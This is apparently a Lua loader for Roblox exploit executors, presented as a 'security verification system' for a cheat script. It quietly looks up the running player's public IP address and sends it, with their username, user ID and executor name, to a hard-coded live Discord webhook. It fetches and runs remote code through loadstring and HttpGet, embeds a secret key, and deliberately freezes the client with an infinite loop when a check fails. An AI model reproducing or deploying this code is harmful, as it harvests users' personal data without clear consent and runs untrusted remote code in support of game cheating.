-- Configuration
local GITHUB_URL = "https://raw.githubusercontent.com/Idontknowhowtotype/NS2M/main/EXP"
local VERIFY_SERVER = "https://cg62437.tw1.ru/verify.php"
local SECRET_KEY = "e8beea11-5080-43d3-8b12-c972a432266c"
local DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1368943641761943704/f6dQOT68c9Oo6Qh0ys6fmPnmL0-7K5GZPMRj3DTvFPj_Pm_Cm10XAQyEGqj6jhmLpsWv"

--[[
    Verification Process Flow:
    1. Initial source check (client-side)
    2. Server registration & Discord logging
    3. Content verification (server-side hash check)
    4. Final execution approval
]]

-- Utility functions
local function GetExecutor()
    local executors = {
        ["Krnl"] = function() return syn and not is_sirhurt_closure end,
        ["Synapse X"] = function() return syn and is_sirhurt_closure end,
        ["ScriptWare"] = function() return SW_LOADED end,
        ["Fluxus"] = function() return identifyexecutor and identifyexecutor():find("Fluxus") end
    }
    
    for name, check in pairs(executors) do
        if check() then return name end
    end
    return "Unknown"
end

local function GetIP()
    local services = {
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://icanhazip.com"
    }
    
    for _, url in ipairs(services) do
        local success, ip = pcall(game.HttpGet, game, url)
        if success and ip then return ip:gsub("%s+", "") end
    end
    return "Unknown"
end

-- Discord logging with anti-tampering
local function LogToDiscord(eventType, details)
    local player = game:GetService("Players").LocalPlayer
    local embed = {
        ["title"] = "üöÄ Script Execution Event",
        ["description"] = string.format("**Event Type:** %s\n**Timestamp:** %s", eventType, os.date("%c")),
        ["color"] = eventType == "VALID_EXECUTION" and 65280 or 16711680,
        ["fields"] = {
            {["name"] = "üë§ Player", ["value"] = player.Name.." (@"..player.DisplayName..")", ["inline"] = true},
            {["name"] = "üÜî User ID", ["value"] = player.UserId, ["inline"] = true},
            {["name"] = "üåê IP Address", ["value"] = GetIP(), ["inline"] = true},
            {["name"] = "‚ö° Executor", ["value"] = GetExecutor(), ["inline"] = true},
            {["name"] = "üîó Source URL", ["value"] = details.source or "Unknown", ["inline"] = false},
            {["name"] = "üìù Details", ["value"] = details.message or "No additional info", ["inline"] = false}
        },
        ["footer"] = {
            ["text"] = "Naramo Nuclear Plant Security System"
        }
    }
    
    -- Try different request methods
    local requestMethods = {
        function()
            return request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    embeds = {embed},
                    username = "Security Monitor",
                    avatar_url = "https://i.imgur.com/aEb8TU9.jpeg"
                })
            })
        end,
        
        function()
            return syn and syn.request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({embeds = {embed}})
            })
        end
    }
    
    for _, method in ipairs(requestMethods) do
        pcall(method)
    end
end

-- Server communication with retry logic
local function ServerRequest(params)
    local url = VERIFY_SERVER.."?"
    for k, v in pairs(params) do
        url = url..k.."="..game:GetService("HttpService"):UrlEncode(tostring(v)).."&"
    end
    
    local lastError = "No attempts made"
    for i = 1, 3 do -- Retry up to 3 times
        local success, response = pcall(game.HttpGet, game, url)
        if success then
            return response
        else
            lastError = response
            wait(2^i) -- Exponential backoff
        end
    end
    error("Server request failed: "..lastError)
end

-- Content verification with hash fallback
local function VerifyContent()
    local content
    local success, err = pcall(function()
        content = game:HttpGet(GITHUB_URL)
    end)
    
    if not success then
        LogToDiscord("CONTENT_FETCH_FAILED", {
            source = GITHUB_URL,
            message = "Failed to fetch script content: "..err
        })
        return false
    end
    
    -- Try HashService first
    local hash
    success, hash = pcall(function()
        return game:GetService("HashService"):ComputeMD5Hash(content)
    end)
    
    -- Simple fallback if HashService unavailable
    if not success then
        hash = "fallback_"..#content
    end
    
    local response = ServerRequest({
        action = "validate",
        key = SECRET_KEY,
        contentHash = hash,
        userId = game:GetService("Players").LocalPlayer.UserId
    })
    
    return response == "VERIFIED"
end

-- Main verification flow
local function VerifyExecution()
    -- Phase 1: Source verification
    local currentSource
    if getscriptsource then
        currentSource = getscriptsource()
    elseif debug and debug.getinfo then
        local info = debug.getinfo(2, "S")
        if info then currentSource = info.source end
    end
    
    -- Strict GitHub URL check
    if currentSource ~= GITHUB_URL then
        LogToDiscord("INVALID_SOURCE", {
            source = currentSource or "Unknown",
            message = "Execution attempted from unauthorized source"
        })
        return false
    end
    
    -- Phase 2: Server registration
    local response = ServerRequest({
        action = "init",
        key = SECRET_KEY,
        scriptUrl = GITHUB_URL,
        userId = game:GetService("Players").LocalPlayer.UserId
    })
    
    if response ~= "APPROVED" then
        LogToDiscord("SERVER_REJECTED", {
            source = GITHUB_URL,
            message = "Server rejected execution: "..tostring(response)
        })
        return false
    end
    
    -- Phase 3: Content verification
    if not VerifyContent() then
        LogToDiscord("CONTENT_MISMATCH", {
            source = GITHUB_URL,
            message = "Script content verification failed"
        })
        return false
    end
    
    -- Final approval
    LogToDiscord("VALID_EXECUTION", {
        source = GITHUB_URL,
        message = "All checks passed successfully"
    })
    return true
end

-- Execution flow
if VerifyExecution() then
    -- Load your actual script here
    print("All verifications passed! Loading main script...")
    
    -- Your ArrayField script would go here
    local ArrayField = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/ArrayField/main/Source.lua'))()
    -- ... rest of your script
    
else
    -- Anti-tampering measures
    warn("Verification failed! This incident has been logged.")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Security Alert",
        Text = "Execution blocked by verification system",
        Duration = 5
    })
    
    -- Crash the script in a way that prevents easy bypass
    while true do end
end
